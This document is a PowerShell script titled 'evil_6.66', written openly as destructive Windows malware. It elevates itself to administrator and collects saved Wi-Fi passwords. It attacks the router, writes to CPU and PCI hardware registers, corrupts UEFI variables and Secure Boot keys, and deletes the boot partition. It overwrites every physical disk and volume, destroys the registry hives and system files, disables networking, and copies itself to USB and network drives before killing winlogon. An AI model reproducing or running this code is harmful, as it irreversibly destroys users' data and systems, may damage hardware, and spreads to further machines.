# evil_6.66
param([Switch]$Force)
if (-NOT $Force) { exit }
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`" -Force" -Verb RunAs
    exit
}

function Set-PendingDelete {
    param($Path)
    if (Test-Path $Path) { reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "PendingFileRenameOperations" /t REG_MULTI_SZ /d "\??\$Path\0\0" /f 2>$null }
}

function Stop-CriticalDriver {
    param($Driver)
    sc config "$Driver" start= disabled 2>$null
    reg delete "HKLM\SYSTEM\CurrentControlSet\Services\$Driver" /f 2>$null
    Set-PendingDelete "C:\Windows\System32\drivers\$Driver.sys"
}

$wifiPasswords = @{}
try {
    $profiles = netsh wlan show profiles | Select-String ":" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    foreach ($profile in $profiles) {
        $output = netsh wlan show profile name="$profile" key=clear
        $pass = $output | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
        if (-NOT $pass) { $pass = $output | Select-String "Ключ содержимого" | ForEach-Object { ($_ -split ":")[1].Trim() } }
        if ($pass -and $pass -ne "Отсутствует") { $wifiPasswords[$profile] = $pass }
    }
} catch {}

$gateway = $null
try { $gateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -EA 0).NextHop } catch {}
if (-NOT $gateway) { try { $gateway = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.DefaultIPGateway }).DefaultIPGateway[0] } catch {} }
if (-NOT $gateway) { try { $gateway = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }).IPv4DefaultGateway.NextHop } catch {} }

if ($gateway) {
    try { Invoke-WebRequest -Uri "http://$gateway/reboot" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
    try { Invoke-WebRequest -Uri "http://$gateway/reset" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
    try { Invoke-WebRequest -Uri "http://$gateway/userRpm/SysRebootRpm.htm" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
    try { Invoke-WebRequest -Uri "http://$gateway/goform/reboot" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
    try { Invoke-WebRequest -Uri "http://$gateway/rebootinfo.cgi" -Method GET -TimeoutSec 2 -UseBasicParsing -EA 0 } catch {}
}

$winRing0Path = Join-Path $PSScriptRoot "WinRing0x64.dll"
if (Test-Path $winRing0Path) {
    try {
        $wr0 = @"
using System;
using System.Runtime.InteropServices;
public class WRO {
    [DllImport("WinRing0x64.dll")] public static extern bool InitializeOls();
    [DllImport("WinRing0x64.dll")] public static extern void DeinitializeOls();
    [DllImport("WinRing0x64.dll")] public static extern bool WriteIoPortByte(ushort Port, byte Data);
    [DllImport("WinRing0x64.dll")] public static extern bool WriteMsr(uint Index, ulong Value);
    [DllImport("WinRing0x64.dll")] public static extern bool WritePciConfigDword(uint PciAddress, uint RegAddress, uint Value);
}
"@
        Add-Type $wr0 -EA 0
        [WRO]::InitializeOls() | Out-Null
        $cpu = (Get-WmiObject Win32_Processor).Name
        if ($cpu -match "Atom") { [WRO]::WriteMsr(0x1FC, 0) } else { [WRO]::WriteMsr(0x1A0, 0); [WRO]::WriteMsr(0x1B0, [UInt64]::MaxValue) }
        for ($bus=0;$bus -le 255;$bus++) { for ($dev=0;$dev -le 31;$dev++) { for ($func=0;$func -le 7;$func++) {
            $addr = 0x80000000 -bor ($bus -shl 16) -bor ($dev -shl 11) -bor ($func -shl 8)
            try { [WRO]::WritePciConfigDword($addr, 0x04, 0) } catch {}
        }}}
        Stop-CriticalDriver "storahci"; Stop-CriticalDriver "msahci"; Stop-CriticalDriver "pciide"
        $ecPorts = @(0x66,0x62), @(0x68,0x6C), @(0x290,0x291)
        foreach($ec in $ecPorts) { try { [WRO]::WriteIoPortByte($ec[0],0x81); [WRO]::WriteIoPortByte($ec[1],0x00); [WRO]::WriteIoPortByte($ec[0],0x81); [WRO]::WriteIoPortByte($ec[1],0xFF) } catch {} }
        [WRO]::DeinitializeOls()
    } catch {}
}

Get-PnpDevice | Where-Object { $_.FriendlyName -notmatch "ACPI|PCI|Processor|System|Motherboard|ISA" } | ForEach-Object { Disable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false -Force -EA 0 }
Set-PendingDelete "C:\Windows\System32\drivers\tpm.sys"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TPM" /v Start /t REG_DWORD /d 4 /f 2>$null
Stop-CriticalDriver "Thunderbolt"; Stop-CriticalDriver "TbtBus"; Stop-CriticalDriver "TbtP2p"
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -EA 0 | ForEach-Object { Set-ItemProperty -Path $_.PSPath -Name Start -Value 4 -EA 0 }

try {
    $uefiGuid = "{8BE4DF61-93CA-11D2-AA0D-00E098032B8C}"
    $vars = @("BootOrder","Boot0000","Boot0001","Boot0002","Boot0003","Boot0004","Boot0005","BootCurrent","BootNext","Timeout","Lang","OsIndications","SecureBoot","PK","KEK","db","dbx")
    foreach ($v in $vars) { Set-FirmwareEnvironmentVariable -Name $v -Namespace $uefiGuid -Value ([byte[]]@(0xFF,0xFF,0xFF,0xFF)) -EA 0 }
} catch {}

try { mountvol Z: /s 2>$null } catch {}
if (Test-Path "Z:\") { Remove-Item "Z:\EFI\*" -Recurse -Force -EA 0; Remove-Item "Z:\*" -Force -EA 0; mountvol Z: /d 2>$null } else {
    $esp = Get-Partition -EA 0 | Where-Object { $_.Type -eq "System" -or $_.GptType -eq "{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}" }
    if ($esp) { try { $esp | Add-PartitionAccessPath -AccessPath "Z:\" -EA 0; Remove-Item "Z:\EFI\*" -Recurse -Force -EA 0; Remove-Item "Z:\*" -Force -EA 0; mountvol Z: /d 2>$null } catch {} }
}
bcdedit /delete {bootmgr} /f 2>$null; bcdedit /delete {default} /f 2>$null; bcdedit /delete {current} /f 2>$null
Remove-Item "C:\Boot\BCD" -Force -EA 0; Remove-Item "C:\bootmgr" -Force -EA 0
bcdedit /set {current} testsigning on 2>$null; bcdedit /set {current} nointegritychecks on 2>$null

$disks = Get-WmiObject Win32_DiskDrive -EA 0
$patterns = @(0x00,0xFF,0x00,0xFF,0x00,0xFF,0xAA)
$diskpartScript = ""
foreach ($disk in $disks) {
    try { $size = [long]$disk.Size; if ($size -le 0) { continue }
        $path = "\\.\PhysicalDrive$($disk.Index)"; $fs = [IO.File]::OpenWrite($path); $block = New-Object byte[] (10MB)
        foreach ($pattern in $patterns) { for ($i=0;$i -lt $block.Length;$i++) { $block[$i]=$pattern }; $total = [math]::Ceiling($size/10MB); for ($i=0;$i -lt $total -and $i -lt 10000;$i++) { $fs.Write($block,0,$block.Length); if ($i%100 -eq 0) { $fs.Flush() } } }
        $fs.Close()
        $diskpartScript += "select disk $($disk.Index)`nclean all`n"
    } catch {}
}
$diskpartScript += "exit"
$diskpartScript | Out-File -FilePath "$env:TEMP\diskpart_script.txt" -Force
if (Test-Path "$env:TEMP\diskpart_script.txt") { Start-Process diskpart.exe -Wait -NoNewWindow -ArgumentList "/s `"$env:TEMP\diskpart_script.txt`"" -EA 0 }

Manage-bde -off C: -Force 2>$null; Manage-bde -off D: -Force 2>$null; Manage-bde -off E: -Force 2>$null
$drives = Get-PSDrive -PSProvider FileSystem -EA 0
foreach ($drive in $drives) { $root = $drive.Root.Replace("\",""); if ($root -match "^[A-Z]$") { try { $raw="\\.\$root`:"; $fs=[IO.File]::OpenWrite($raw); $zero=New-Object byte[] (100MB); for($i=0;$i -lt 200;$i++) { $fs.Write($zero,0,$zero.Length); if($i%10 -eq 0){$fs.Flush()} }; $fs.Close() } catch {} } }

$allDrivers = @("disk","partmgr","volume","storahci","stornvme","pci","acpi","mountmgr","fvevol","USBSTOR","USBHUB3","USBXHCI","i8042prt","kbdclass","mouclass","HID","monitor","display","BasicDisplay","BasicRender","dxgkrnl","ntfs","refs","fat","exfat","udfs","cdfs","tcpip","ndis","netbt","mrxsmb","srvnet","srv2","tdx","pciide","pcmcia","battery","cng","HdAudAddService","bthport","BTHUSB","usbvideo","dc3d","VMBus")
foreach ($d in $allDrivers) { Stop-CriticalDriver $d }
Get-ChildItem "C:\Windows\System32\drivers\*.sys" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }

$regHives = @("SYSTEM","SOFTWARE","SAM","SECURITY","DEFAULT")
foreach ($hive in $regHives) { $target = "C:\Windows\System32\config\$hive"; try { $null = [IO.File]::WriteAllBytes($target, [byte[]]::new(10MB)) } catch { Set-PendingDelete $target } }
reg delete "HKLM\SOFTWARE\Classes" /f 2>$null
reg delete "HKLM\SYSTEM\CurrentControlSet\Services" /f 2>$null
$packages = Get-AppxPackage -AllUsers -EA 0
foreach ($pkg in $packages) { try { Remove-AppxPackage -Package $pkg -EA 0 } catch {} }

Get-ChildItem "C:\Windows\System32\*.mui" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
Get-ChildItem "C:\Windows\System32\*.dll" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
Get-ChildItem "C:\Windows\System32\*.exe" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
Get-ChildItem "C:\Windows\Fonts\*" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
Get-ChildItem "C:\Windows\Media\*" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }
Get-ChildItem "C:\Windows\Resources\Themes\*" -EA 0 | ForEach-Object { Set-PendingDelete $_.FullName }

try {
    $adapters = Get-NetAdapter -EA 0 | Where-Object { $_.Name -ne "Loopback" }
    foreach ($adapter in $adapters) { Disable-NetAdapter -Name $adapter.Name -Confirm:$false -Force -EA 0 }
} catch {}
netsh wlan delete profile * 2>$null
try { route -f 2>$null } catch {}
try { netsh int ip reset all 2>$null } catch {}
try { netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound 2>$null } catch {}
sc config Dnscache start= disabled 2>$null
sc stop Dnscache 2>$null
try { Get-NetFirewallRule | Disable-NetFirewallRule -EA 0 } catch {}

try {
    $networkDrives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 4 }
    foreach ($netDrive in $networkDrives) { Copy-Item -LiteralPath $PSCommandPath -Destination "$($netDrive.DeviceID)\evil.ps1" -Force -EA 0 }
    $usbDrives = Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq "USB" -or $_.InterfaceType -eq "USB" }
    foreach ($usb in $usbDrives) {
        $partitions = Get-Partition -DiskNumber $usb.Index -EA 0
        foreach ($part in $partitions) { if ($part.DriveLetter) { Copy-Item -LiteralPath $PSCommandPath -Destination "$($part.DriveLetter):\evil.ps1" -Force -EA 0 } }
    }
} catch {}

Set-PendingDelete $PSCommandPath
try { Stop-Process -Name "winlogon" -Force -EA 0 } catch {}
Stop-Computer -Force
